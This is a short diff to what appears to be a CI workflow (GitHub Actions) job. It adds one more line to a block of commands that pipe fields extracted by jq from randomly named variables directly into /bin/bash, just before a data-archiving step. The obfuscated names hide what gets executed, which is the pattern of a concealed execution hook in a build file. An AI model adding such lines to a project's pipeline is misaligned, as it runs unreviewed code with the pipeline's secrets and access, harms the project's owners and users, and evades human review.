@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$kph0" | jq -r .tebgr479 | /bin/bash
           echo $iicpq7 | jq -r .flk73411 | /bin/bash
           printf '%s' "$bky90728" | jq -r .n9264 | /bin/bash
+          echo $krbhn84 | jq -r .qy09300 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
